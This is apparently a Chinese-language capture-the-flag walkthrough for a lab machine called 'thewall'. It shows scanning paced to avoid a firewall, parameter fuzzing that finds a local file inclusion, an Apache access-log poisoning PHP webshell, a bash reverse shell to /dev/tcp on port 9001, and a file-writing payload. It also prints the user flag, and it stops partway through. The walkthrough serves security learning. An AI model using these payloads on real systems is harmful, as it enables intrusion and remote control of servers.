
|   |   |   |
|---|---|---|
|thewall|easy|Akamai  防火墙、绕过wall、fuzz、文件包含利用、exiftool提权、sudo提权、ssh私钥利用|

# 服务探测
```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p 22,80 192.168.18.238 
```

22，80
### 目录扫描

由于目标靶场安装了Akamai  防火墙，正常的扫描会被拦截。所以使用gobuster扫描的时候增加延时和线程控制
```css
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.18.238 -x php -e --delay 1s -t 1 


http://192.168.18.238/includes.php
```
这里扫描出来了一个文件包含名字的文件，尝试对其进行fuzz 参数。这里发现任何访问的响应都是200和长度为2，所以还需要设置排除项
```c
wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.18.238/includes.php?FUZZ=/etc/passwd'


000217299:   200        28 L     41 W       1460 Ch    "display_pag“
```

得到传入的参数为display_page


# GETSHELL
通过bp 爆破了发现利用访问日志记录。

那我们可以尝试写入webshell到日志，然后取包含它

```css
┌──(kali㉿kali)-[~]
└─$ nc 192.168.18.238 80
GET <?php system($_GET['cmd']); ?>


http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26/dev/tcp/192.168.44.128/9001+0%3E%261%27
```

获得第一个flag
```c
www-data@TheWall:/home/john$ cat user.txt
cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

使用file_put_contents函数写入shell

```c
nc 192.168.18.238 80 
GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>
```

访问一下链接：http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log
然后确定`<?php phpinfo();?>`base64编码的代码
```css
http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgcGhwaW5mbygpOyA/Pg==
```
